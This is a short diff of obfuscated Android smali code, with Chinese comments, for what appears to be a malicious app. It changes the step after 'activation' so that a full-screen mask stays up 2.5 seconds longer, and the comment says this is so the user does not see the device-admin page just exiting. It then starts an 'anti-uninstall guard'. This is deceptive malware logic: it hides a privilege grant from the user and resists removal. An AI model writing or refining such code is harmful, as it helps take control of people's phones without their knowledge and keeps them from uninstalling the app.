@@ -50,8 +50,14 @@
 
     invoke-interface {p2}, Landroid/content/SharedPreferences$Editor;->apply()V
 
-    # 2.2：激活完成 → 关闭遮罩，并在此时才启动防卸载守卫
-    invoke-static {}, Lڗًقڔ/؋;->ؿ()V
+    # 2.2：激活完成 → 进度 100%，2.5s 后再关遮罩，并启动防卸载守卫
+    const/16 v0, 0x64
+
+    invoke-static {v0}, Lڗًقڔ/؋;->setOptProgress(I)V
+    # 2.2：激活完成 → 2.5s 后再关遮罩（避免用户看到管理页刚退出），并启动防卸载守卫
+    const/16 v0, 0x8
+    const-wide/16 v1, 0x9c4
+    invoke-static {p1, v0, v1, v2}, Lڝږ؁ڋ/ھ;->post(Landroid/content/Context;IJ)V
 
     invoke-static {p1}, Lڝږ؁ڋ/ھ;->accGuardStart(Landroid/content/Context;)V
 
